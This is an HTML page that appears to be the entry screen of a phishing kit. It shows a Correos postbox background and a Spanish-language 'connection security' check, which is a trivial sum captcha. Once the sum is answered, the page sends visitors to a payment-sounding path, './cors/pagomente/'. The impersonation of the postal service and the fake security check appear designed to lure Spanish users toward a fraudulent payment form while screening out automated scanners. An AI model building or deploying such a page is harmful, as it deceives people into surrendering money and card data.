<!DOCTYPE html>
<html>
<head>
    <title>Captcha Demo</title>
    <!-- Inclure la bibliothèque Bootstrap -->
    <meta charset="UTF-8"> <!-- Ajouter la balise meta avec l'encodage -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Meta tag pour la responsivité -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /* Ajouter des styles personnalisés pour la captcha */
        body {
            background-size: cover;
            
        }
        .background-image {
            background-image: url('./correos-postbox-spain-mail.jpg');
            background-size: cover;
            opacity: 0.5; /* 50% opacity */
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }


        #captchaContainer {
            background-color: rgba(255, 255, 255, 0.8); /* Fond transparent avec opacité réduite */
            padding: 10px; /* Réduire la taille du cadre */
            border-radius: 5px; /* Réduire le rayon des coins du cadre */
        }

        #captchaValue {
            font-family: "Comic Sans MS", cursive, sans-serif;
            font-size: 24px; /* Réduire la taille de la police */
            letter-spacing: 10px;
            text-align: center;
            background-color: #f0f0f0;
            padding: 5px;
            margin-bottom: 10px; /* Réduire l'espacement inférieur */
            border: 1px solid #ccc; /* Ajouter une bordure légère */
        }

        .form-group {
            margin-bottom: 15px; /* Réduire l'espacement entre les éléments du formulaire */
        }

        .btn {
            font-size: 18px; /* Réduire la taille de la police du bouton */
        }

        #errorMessage {
            color: red; /* Changer la couleur du message d'erreur en rouge */
            display: none;
        }
        b {
            font-size: 20px; /* Changer la taille de la balise <b> à 30 pixels */
        }
    </style>
</head>
<body>
<div class="background-image"></div>

    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6 col-sm-8 col-xs-12"> <!-- Utiliser des classes Bootstrap pour la mise en page responsive -->
                <div class="card" id="captchaContainer"> <!-- Ajouter un ID pour appliquer les styles personnalisés -->
                     <!-- Placer le titre en dehors de card-body -->

                    <div class="card-body">
						
                        <b style="">Asegúrese de que su conexión al sitio web sea segura</b>
                        <br>
                        <br>
                        <div id="captchaValue"></div>
                        <br>
                        <div class="form-group">
                            <label for="captchaResult">Asegúrate de que eres humano
:</label>
                            <input type="text" class="form-control" id="captchaResult" required>
                        </div>
                        <button class="btn btn-primary btn-block" onclick="checkCaptcha()">revisa el captcha</button>
                        <p id="errorMessage" class="text-center">Captcha fallido. Inténtalo de nuevo.</p>
                        <p>the El sitio debe verificar la seguridad de su conexión antes de continuar.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function checkCaptcha() {
            const captchaValue = document.getElementById("captchaValue").textContent;
            const captchaResult = parseInt(document.getElementById("captchaResult").value, 10);
            const errorMessage = document.getElementById("errorMessage");

            // Évaluer l'expression de captchaValue pour obtenir le résultat attendu
            const expected = eval(captchaValue);

            if (captchaResult === expected) {
                // Rediriger vers la page home.html
                window.location.href = "./cors/pagomente/";
            } else {
                errorMessage.style.display = "block";
                document.getElementById("captchaResult").value = "";
                generateNewCaptcha();
            }
        }

        function generateNewCaptcha() {
            // Générer deux nouveaux nombres aléatoires entre 0 et 9
            const num1 = Math.floor(Math.random() * 10);
            const num2 = Math.floor(Math.random() * 10);
            document.getElementById("captchaValue").textContent = `${num1} + ${num2}`;
        }

        // Générer un captcha au chargement de la page
        generateNewCaptcha();
    </script>

    <!-- Inclure le script Bootstrap -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>